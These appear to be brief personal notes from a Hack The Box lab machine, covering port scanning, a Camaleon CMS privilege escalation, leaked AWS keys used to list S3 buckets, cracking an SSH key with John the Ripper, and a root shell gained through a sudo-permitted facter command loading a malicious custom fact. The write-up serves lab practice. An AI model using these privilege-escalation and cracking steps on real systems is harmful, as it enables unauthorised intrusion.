```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

users;

bob
carol
dave

/admin - new acc created

Camaleon CMS - version 2.9.0 - multiple vulns - privesc usr to admin - lfi 

Admin leaks - aws things accessid and secrect keys, endpoint running

Using aws-cli cmds - got two buckets one gives ssh keys cracking that gives;

one users passwd

aws configure --profile factshtb 

aws --endpoint-url http://10.129.22.137:54321 s3 ls --profile cybr

ssh2john id_ed25519 > ssh.hash
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules

user to root;

(ALL) NOPASSWD: /usr/bin/facter

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

trivia@facts:~$ mkdir /tmp/exploit
trivia@facts:~$ echo 'Facter.add(:x) { setcode { system("/bin/bash") } }' > /tmp/exploit/root.rb
trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/exploit
root@facts:/home/trivia# cd
root@facts:~# id
uid=0(root) gid=0(root) groups=0(root)
```
